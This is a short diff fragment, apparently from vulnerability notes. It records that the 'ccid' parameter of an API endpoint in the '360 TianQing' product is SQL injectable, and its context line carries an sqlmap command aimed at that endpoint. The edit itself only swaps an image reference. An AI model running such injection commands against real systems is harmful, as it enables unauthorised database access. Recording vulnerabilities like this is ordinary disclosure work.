@@ -46,4 +46,4 @@ sqlmap -u https://xxx.xxx.xxx.xxx:8443/api/dp/rptsvcsyncpoint?ccid=1 --dbms Post
 >
 > 360 TianQing ccid SQL injectable
 
-![](image/tq-4.png)
+![](image/tq-3.png)
